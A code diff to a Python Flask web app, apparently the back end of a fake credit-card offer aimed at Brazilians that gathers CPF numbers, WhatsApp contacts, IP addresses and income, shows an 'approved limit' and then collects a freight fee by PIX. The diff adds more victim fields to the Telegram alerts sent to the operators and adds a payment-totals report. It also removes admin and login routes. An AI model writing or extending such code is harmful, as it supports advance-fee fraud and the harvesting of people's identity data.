@@ -357,11 +357,13 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
         texto += f"🪪 <b>CPF:</b> <code>{lead['cpf'] or '...'}</code>\n"
         if lead.get('whatsapp'): texto += f"📱 <b>WhatsApp:</b> <code>{lead['whatsapp']}</code>\n"
         texto += f"🌍 <b>IP:</b> <code>{lead['ip'] or '...'}</code>\n\n"
-        
         texto += f"📊 <b>ETAPAS DO FUNIL:</b>\n"
+        texto += f"📋 Motivo do Crédito: {lead['motivo_credito'] or '...'}\n"
+        texto += f"💼 Tipo de Renda: {lead['tipo_renda'] or '...'}\n"
         texto += f"💰 Renda Informada: R$ {lead['renda'] or '...'}\n"
+        texto += f"📅 Dia Vencimento: {lead['dia_vencimento'] or '...'}\n"
         texto += f"🎯 Limite Aprovado: R$ {lead['limite_aprovado'] or '...'}\n"
-        
+
         if lead['card_style']:
             texto += f"💳 <b>Cartão Escolhido:</b> {lead['card_style']} ({lead['card_color']})\n"
             
@@ -1002,40 +1004,8 @@ def api_manager():
 # ══════════════════════════════════════════════════════════════════════════════
 #  ROUTES — TELEGRAM WEB APPS
 # ══════════════════════════════════════════════════════════════════════════════
-@app.route("/api/tg_webapp/update", methods=["POST"])
-def api_tg_webapp_update():
-    data = get_secure_json()
-    name       = sanitize(data.get("name", ""), 80)
-    since_year = int(data.get("since_year", 2025))
-    wa         = re.sub(r"\D", "", sanitize(data.get("whatsapp", ""), 20))
-    
-    def save_b64(b64str, prefix):
-        if not b64str.startswith("data:image"):
-            return sanitize(b64str, 200)
-        match = re.match(r"data:image/(\w+);base64,(.+)", b64str)
-        if not match: return sanitize(b64str, 200)
-        ext, data_str = match.groups()
-        ext = ext.lower().replace("x-icon", "ico")
-        if ext not in ["png", "jpg", "jpeg", "webp", "gif", "ico"]: ext = "png"
-        fname = f"{prefix}_{uuid.uuid4().hex[:8]}.{ext}"
-        with open(UPLOAD_DIR / fname, "wb") as f:
-            f.write(base64.b64decode(data_str))
-        return f"/static/uploads/{fname}"
 
-    photo   = save_b64(str(data.get("photo_url", "")), "mgr")
-    favicon = save_b64(str(data.get("favicon_url", "")), "fav")
-    
-    db = get_db()
-    db.execute("""
-        UPDATE manager SET name=?,photo_url=?,since_year=?,whatsapp=?,updated_at=(cast(strftime('%s','now') as real))
-        WHERE id=1
-    """, (name, photo, since_year, wa))
-    
-    if favicon:
-        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('favicon_url', ?)", (favicon,))
-        
-    db.commit()
-    return jsonify({"ok": True})
+
 
 @app.route("/api/tg_auth", methods=["POST"])
 def api_tg_auth():
@@ -1111,200 +1081,11 @@ def api_tg_auth():
         "cpf_token": db.execute("SELECT value FROM sys_config WHERE key=\'cpf_token\'").fetchone()["value"] if db.execute("SELECT value FROM sys_config WHERE key=\'cpf_token\'").fetchone() else ""
     })
 
-@app.route("/api/tg_admin_update_settings", methods=["POST"])
-def api_tg_admin_update_settings():
-    data = request.get_json() or {}
-    supreme_id = str(data.get("supreme_id", ""))
-    if supreme_id != os.environ.get("ADMIN_CHAT_ID", ""):
-        return jsonify({"ok": False}), 403
-    
-    freight_price = data.get("freight_price")
-    whatsapp = data.get("whatsapp")
-    cpf_token = data.get("cpf_token")
-    tg_log_channel = data.get("tg_log_channel")
-    mgr_photo_url = data.get("mgr_photo_url")
-    favicon_url = data.get("favicon_url")
-    wa_text = data.get("wa_text")
-    
-    db = get_db()
-    if mgr_photo_url is not None:
-        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('manager_photo_url', ?)", (mgr_photo_url,))
-    if favicon_url is not None:
-        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('favicon_url', ?)", (favicon_url,))
-    if wa_text is not None:
-        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('wa_text', ?)", (wa_text,))
-    if tg_log_channel is not None:
-        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('tg_log_channel', ?)", (tg_log_channel,))
-    if cpf_token is not None:
-        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('cpf_token', ?)", (cpf_token,))
-    if freight_price is not None:
-        db.execute("UPDATE manager SET freight_price=? WHERE id=1", (freight_price,))
-    if whatsapp is not None:
-        # Validate/Clean whatsapp
-        whatsapp = re.sub(r"\D", "", whatsapp)
-        db.execute("UPDATE manager SET whatsapp=? WHERE id=1", (whatsapp,))
-        
-    db.commit()
-    return jsonify({"ok": True, "whatsapp": whatsapp})
-
-@app.route("/api/tg_admin_action", methods=["POST"])
-def api_tg_admin_action():
-    data = request.get_json() or {}
-    supreme_id = str(data.get("supreme_id", ""))
-    if supreme_id != os.environ.get("ADMIN_CHAT_ID", ""):
-        return jsonify({"ok": False}), 403
-        
-    target_id = str(data.get("target_id", ""))
-    action = data.get("action")
-    db = get_db()
-    if action == "ban":
-        db.execute("UPDATE telegram_admins SET status='banned' WHERE tg_id=?", (target_id,))
-    elif action == "unban":
-        db.execute("UPDATE telegram_admins SET status='active' WHERE tg_id=?", (target_id,))
-    elif action == "promote":
-        db.execute("UPDATE telegram_admins SET role='supreme' WHERE tg_id=?", (target_id,))
-    elif action == "demote":
-        db.execute("UPDATE telegram_admins SET role='basic' WHERE tg_id=?", (target_id,))
-    db.commit()
-    return jsonify({"ok": True})
-
-@app.route("/tg_webapp")
-def tg_webapp():
-    return render_template("tg_webapp.html")
-
-@app.route("/tg_webapp_leads")
-def tg_webapp_leads():
-    db = get_db()
-    
-    # 1. Leads que pagaram o frete
-    leads_pagos = db.execute('''
-        SELECT * FROM leads 
-        WHERE pix_status IN ('paid','authorized','completed') 
-        ORDER BY updated_at DESC
-    ''').fetchall()
-    
-    # 2. Leads que abandonaram / cancelaram
-    leads_abandonados = db.execute('''
-        SELECT * FROM leads 
-        WHERE pix_status NOT IN ('paid','authorized','completed')
-        ORDER BY updated_at DESC
-    ''').fetchall()
-    
-    return render_template("tg_webapp_leads.html", 
-                           leads_pagos=[dict(l) for l in leads_pagos],
-                           leads_abandonados=[dict(l) for l in leads_abandonados])
-
-# ══════════════════════════════════════════════════════════════════════════════
-#  ROUTES — ADMIN PANEL
-# ══════════════════════════════════════════════════════════════════════════════
-@app.route("/admin/login")
-def admin_login():
-    db = get_db()
-    token_row = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
-    token = os.environ.get("TELEGRAM_BOT_TOKEN") or (token_row["value"] if token_row else "")
-    bot_username = "SeuBot"
-    if token:
-        import requests
-        try:
-            r = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=3).json()
-            if r.get("ok"):
-                bot_username = r["result"]["username"]
-        except:
-            pass
-    return render_template("admin_login.html", bot_username=bot_username, error=request.args.get("error"))
-
-@app.route("/admin/tg_callback")
-def admin_tg_callback():
-    import hashlib, hmac
-    data = request.args.to_dict()
-    tg_hash = data.pop('hash', None)
-    if not tg_hash:
-        return redirect(url_for("admin_login", error="Autenticação inválida"))
-        
-    db = get_db()
-    token_row = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
-    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN") or (token_row["value"] if token_row else "")
-    
-    data_check_string = "\n".join([f"{k}={v}" for k, v in sorted(data.items())])
-    secret_key = hashlib.sha256(bot_token.encode()).digest()
-    expected_hash = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256).hexdigest()
-    
-    if expected_hash != tg_hash:
-        return redirect(url_for("admin_login", error="Assinatura do Telegram inválida"))
-        
-    tg_id = str(data.get("id"))
-    supreme_id = os.environ.get("ADMIN_CHAT_ID", "")
-    
-    is_supreme = (tg_id == supreme_id)
-    role = "supreme" if is_supreme else "basic"
-    status = "active"
-    
-    row = db.execute("SELECT * FROM telegram_admins WHERE tg_id=?", (tg_id,)).fetchone()
-    if row:
-        if not is_supreme:
-            role = row["role"]
-            status = row["status"]
-            
-    if status == "banned":
-        return redirect(url_for("admin_login", error="Acesso banido pelo Admin Supremo."))
-        
-    session.permanent = True
-    session["admin_id"] = tg_id
-    session["admin_user"] = data.get("first_name", "Admin")
-    session["admin_role"] = role
-    session["admin_photo"] = data.get("photo_url", "")
-    
-    log.info("[ADMIN TG LOGIN] %s @ %s", tg_id, _ip())
-    return redirect(url_for("admin_dashboard"))
 
 
-@app.route("/admin/logout")
-def admin_logout():
-    session.clear()
-    return redirect(url_for("admin_login"))
 
 
-@app.route("/admin")
-@app.route("/admin/")
-@require_admin
-def admin_dashboard():
-    db    = get_db()
-    mgr   = db.execute("SELECT * FROM manager WHERE id=1").fetchone()
-    leads = db.execute("SELECT * FROM leads ORDER BY created_at DESC LIMIT 100").fetchall()
-    pays  = db.execute("SELECT * FROM payments ORDER BY created_at DESC LIMIT 100").fetchall()
-    total_leads = db.execute("SELECT COUNT(*) as c FROM leads").fetchone()["c"]
-    total_paid  = db.execute(
-        "SELECT COUNT(*) as c FROM payments WHERE status IN ('paid','authorized','completed')"
-    ).fetchone()["c"]
-    total_rev   = db.execute(
-        "SELECT COALESCE(SUM(amount),0) as s FROM payments WHERE status IN ('paid','authorized','completed')"
-    ).fetchone()["s"]
 
-    sys_favicon = db.execute("SELECT value FROM sys_config WHERE key='favicon_url'").fetchone()
-    sys_favicon_val = sys_favicon["value"] if sys_favicon else ""
-
-    sys_logo = db.execute("SELECT value FROM sys_config WHERE key='system_logo_url'").fetchone()
-    sys_logo_val = sys_logo["value"] if sys_logo else ""
-
-    # Build sys_config dict
-    cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
-    sys_config_dict = {r["key"]: r["value"] for r in cfg_rows}
-    cpf_calls_val = int(sys_config_dict.get("cpf_api_calls", 0) or 0)
-
-    return render_template(
-        "admin_dashboard.html",
-        mgr=dict(mgr) if mgr else {},
-        leads=[dict(r) for r in leads],
-        pays=[dict(r) for r in pays],
-        total_leads=total_leads,
-        total_paid=total_paid,
-        total_rev=f"R$ {total_rev:,.2f}".replace(",","X").replace(".",",").replace("X","."),
-        admin_user=session.get("admin_user"),
-        sys_favicon=sys_favicon_val,
-        sys_logo=sys_logo_val,
-        sys_config=sys_config_dict,
-        cpf_calls=cpf_calls_val,
-    )
 
 
 
@@ -1392,13 +1173,6 @@ def admin_update_logo():
     return jsonify({"ok": True, "logo_url": logo_url})
 
 
-@app.route("/admin/logo", methods=["GET"])
-@require_admin
-def admin_get_logo():
-    db = get_db()
-    row = db.execute("SELECT value FROM sys_config WHERE key='system_logo_url'").fetchone()
-    return jsonify({"ok": True, "logo_url": row["value"] if row else ""})
-
 
 @app.route("/api/internal/set-logo", methods=["POST"])
 def bot_set_logo():
@@ -1438,127 +1212,13 @@ def bot_set_logo_file():
     return jsonify({"ok": True, "logo_url": logo_url})
 
 
-@app.route("/admin/change-password", methods=["POST"])
-@require_admin
-def admin_change_password():
-    data       = get_secure_json()
-    current_pw = data.get("current_password", "")
-    new_pw     = data.get("new_password", "")
-    confirm_pw = data.get("confirm_password", "")
-
-    if new_pw != confirm_pw:
-        return jsonify({"ok": False, "error": "As senhas não coincidem."}), 422
-    if len(new_pw) < 6:
-        return jsonify({"ok": False, "error": "A senha deve ter no mínimo 6 caracteres."}), 422
-
-    db  = get_db()
-    row = db.execute("SELECT * FROM admin WHERE id=?", (session["admin_id"],)).fetchone()
-    if not row or not check_password_hash(row["password"], current_pw):
-        return jsonify({"ok": False, "error": "Senha atual incorreta."}), 403
-
-    db.execute("UPDATE admin SET password=? WHERE id=?",
-               (generate_password_hash(new_pw), session["admin_id"]))
-    db.commit()
-    return jsonify({"ok": True})
 
 
-@app.route("/admin/api_cpf_update", methods=["POST"])
-@require_admin
-def admin_api_cpf_update():
-    if session.get("admin_user") != "admin":
-        return jsonify({"success": False, "error": "Apenas o admin supremo pode alterar."}), 403
-        
-    token = request.form.get("cpf_api_token", "").strip()
-    if not token:
-        return jsonify({"success": False, "error": "Token não pode estar vazio."})
-        
-    try:
-        db = get_db()
-        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('cpf_api_token', ?)", (token,))
-        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('cpf_api_calls', '0')")
-        db.commit()
-        return jsonify({"success": True, "message": "Token atualizado e contador zerado!"})
-    except Exception as e:
-        log.error("Erro update cpf_api: %s", e)
-        return jsonify({"success": False, "error": str(e)})
-
-@app.route("/admin/api/stats")
-@require_admin
-def admin_api_stats():
-    db      = get_db()
-    since24 = time.time() - 86400
-    total   = db.execute("SELECT COUNT(*) as c FROM leads").fetchone()["c"]
-    today   = db.execute("SELECT COUNT(*) as c FROM leads WHERE created_at>=?", (since24,)).fetchone()["c"]
-    paid    = db.execute(
-        "SELECT COUNT(*) as c FROM payments WHERE status IN ('paid','authorized','completed')"
-    ).fetchone()["c"]
-    rev     = db.execute(
-        "SELECT COALESCE(SUM(amount),0) as s FROM payments WHERE status IN ('paid','authorized','completed')"
-    ).fetchone()["s"]
-    return jsonify({
-        "ok":          True,
-        "total_leads": total,
-        "today_leads": today,
-        "total_paid":  paid,
-        "revenue":     f"R$ {rev:,.2f}".replace(",","X").replace(".",",").replace("X","."),
-    })
 
 
-@app.route("/admin/api/leads")
-@require_admin
-def admin_api_leads():
-    db   = get_db()
-    rows = db.execute("SELECT * FROM leads ORDER BY created_at DESC LIMIT 200").fetchall()
-    leads = []
-    for r in rows:
-        d = dict(r)
-        d["created_at_fmt"] = datetime.fromtimestamp(d["created_at"]).strftime("%d/%m/%Y %H:%M")
-        leads.append(d)
-    return jsonify({"ok": True, "leads": leads})
 
-@app.route("/admin/api/logo", methods=["POST"])
-@require_admin
-def admin_api_logo():
-    db = get_db()
-    
-    # Check if a file was uploaded
-    if "file" in request.files:
-        file = request.files["file"]
-        if file.filename != "":
-            ext = file.filename.rsplit(".", 1)[-1].lower()
-            if ext in ALLOWED_IMG_EXT:
-                filename = f"logo_{uuid.uuid4().hex}.{ext}"
-                filepath = UPLOAD_DIR / filename
-                file.save(filepath)
-                logo_url = f"/static/uploads/{filename}"
-                db.execute("INSERT INTO sys_config (key, value) VALUES ('system_logo', ?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (logo_url,))
-                db.commit()
-                return jsonify({"ok": True, "logo_url": logo_url})
-            return jsonify({"ok": False, "error": "Formato de arquivo inválido. (Use png, jpg, webp, gif)"})
-
-    # Fallback to JSON or Form payload for URL
-    data = request.get_json(silent=True) or {}
-    url = request.form.get("logo_url") or request.form.get("url") or data.get("url") or data.get("logo_url")
-    if url and url.startswith("http") or url.startswith("/"):
-        db.execute("INSERT INTO sys_config (key, value) VALUES ('system_logo', ?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (url,))
-        db.commit()
-        return jsonify({"ok": True, "logo_url": url})
-        
-    return jsonify({"ok": False, "error": "Envie um arquivo ou uma URL válida."})
-
-# ══════════════════════════════════════════════════════════════════════════════
-#  STATIC / HEALTH / ERRORS
-# ══════════════════════════════════════════════════════════════════════════════
 @app.route("/health")
-@app.route("/api/admin/bot-config", methods=["POST"])
-@app.route("/api/admin/bot-config", methods=["GET"])
-def api_admin_bot_config_get():
-    db = get_db()
-    keys = ['telegram_token', 'tg_log_channel', 'tg_log_thread_id', 'tg_tpl_entry', 'tg_tpl_card_chosen', 'tg_tpl_pix_generated', 'tg_tpl_pix_paid']
-    placeholders = ','.join(['?']*len(keys))
-    rows = db.execute(f"SELECT key, value FROM sys_config WHERE key IN ({placeholders})", keys).fetchall()
-    cfg = {r["key"]: r["value"] for r in rows}
-    return jsonify(cfg)
+
 
 @app.route('/api/admin/bot-config', methods=['POST'])
 def api_admin_bot_config():
@@ -1574,18 +1234,6 @@ def api_admin_bot_config():
 
 
 
-@app.route("/api/admin/advanced-config", methods=["POST"])
-def api_admin_advanced_config():
-    data = request.get_json()
-    db = get_db()
-    
-    # Save generic configs
-    for key in ['mgr_name', 'mgr_years', 'mgr_avatar', 'favicon', 'pixel_code']:
-        if key in data:
-            db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES (?, ?)", (key, data[key]))
-            
-    db.commit()
-    return jsonify({"ok": True})
 
 @app.route("/api/config", methods=["GET"])
 def api_get_public_config():
@@ -1633,10 +1281,25 @@ def api_bot_gateway():
         rows = db.execute("SELECT * FROM leads ORDER BY created_at DESC LIMIT ?", (limit,)).fetchall()
         return jsonify({"ok": True, "leads": [dict(r) for r in rows]})
         
+
     elif action == "get_payments":
         limit = payload.get("limit", 10)
         rows = db.execute("SELECT * FROM payments ORDER BY created_at DESC LIMIT ?", (limit,)).fetchall()
         return jsonify({"ok": True, "payments": [dict(r) for r in rows]})
+        
+    elif action == "get_financeiro":
+        total_leads = db.execute("SELECT COUNT(*) FROM leads").fetchone()[0]
+        pagos = db.execute("SELECT SUM(amount), COUNT(*) FROM payments WHERE status='approved' OR status='pago'").fetchone()
+        pendentes = db.execute("SELECT COUNT(*) FROM payments WHERE status='pending'").fetchone()[0]
+        
+        stats = {
+            "qtd_leads": total_leads,
+            "total_pago": f"{pagos[0] or 0:.2f}",
+            "qtd_pago": pagos[1] or 0,
+            "qtd_pendente": pendentes
+        }
+        return jsonify({"ok": True, "stats": stats})
+
         
     return jsonify({"ok": False, "error": "Unknown action"}), 400
 
